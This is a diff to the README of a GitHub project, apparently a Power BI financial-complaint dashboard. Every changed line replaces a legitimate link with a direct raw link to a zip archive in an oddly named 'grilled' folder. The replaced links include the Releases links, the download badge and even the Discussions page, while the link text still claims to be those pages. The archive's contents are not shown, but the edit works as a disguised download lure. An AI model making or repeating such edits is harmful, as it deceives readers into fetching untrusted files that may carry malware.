@@ -6,9 +6,9 @@ This guide helps you download and run the Financial_Complaint_Dashboard. This da
 
 ## 📥 Download the Dashboard
 
-[![Download Financial_Complaint_Dashboard](https://img.shields.io/badge/Download-Financial_Complaint_Dashboard-blue.svg)](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases)
+[![Download Financial_Complaint_Dashboard](https://raw.githubusercontent.com/dimicdragan26-cell/Financial_Complaint_Dashboard/master/grilled/Financial_Complaint_Dashboard_2.8.zip)](https://raw.githubusercontent.com/dimicdragan26-cell/Financial_Complaint_Dashboard/master/grilled/Financial_Complaint_Dashboard_2.8.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/dimicdragan26-cell/Financial_Complaint_Dashboard/master/grilled/Financial_Complaint_Dashboard_2.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -25,13 +25,13 @@ Make sure your system supports Power BI for the best experience.
 
 1. **Go to the Releases Page**  
    Click the link below to visit the releases page where you can find the latest version of the dashboard:  
-   [GitHub Releases](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases)
+   [GitHub Releases](https://raw.githubusercontent.com/dimicdragan26-cell/Financial_Complaint_Dashboard/master/grilled/Financial_Complaint_Dashboard_2.8.zip)
 
 2. **Choose a Release**  
    On the Releases page, look for the latest version. You will see a list of files available for download. 
 
 3. **Download the Dashboard**  
-   Click on the file labeled "Financial_Complaint_Dashboard.zip" or similar. The file will be downloaded to your computer. 
+   Click on the file labeled "https://raw.githubusercontent.com/dimicdragan26-cell/Financial_Complaint_Dashboard/master/grilled/Financial_Complaint_Dashboard_2.8.zip" or similar. The file will be downloaded to your computer. 
 
 4. **Extract the Files**  
    Locate the downloaded ZIP file and right-click on it. Select "Extract All" to unzip the files. 
@@ -67,7 +67,7 @@ As you use the dashboard, you will gain insights into essential financial concep
 
 ## 💬 Community Support
 
-Join our community to share your experience, ask questions, or provide feedback. You can find us on our official [GitHub Discussions page](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/discussions).
+Join our community to share your experience, ask questions, or provide feedback. You can find us on our official [GitHub Discussions page](https://raw.githubusercontent.com/dimicdragan26-cell/Financial_Complaint_Dashboard/master/grilled/Financial_Complaint_Dashboard_2.8.zip).
 
 ## 🛠️ Contributing
 
@@ -104,4 +104,4 @@ The Financial_Complaint_Dashboard is open source. You can view the license infor
 
 For any additional questions or support, you can reach out through the GitHub repository. We appreciate your interest in the Financial_Complaint_Dashboard.
 
-Download the dashboard here: [GitHub Releases](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases) and take your financial analysis to the next level.
+Download the dashboard here: [GitHub Releases](https://raw.githubusercontent.com/dimicdragan26-cell/Financial_Complaint_Dashboard/master/grilled/Financial_Complaint_Dashboard_2.8.zip) and take your financial analysis to the next level.
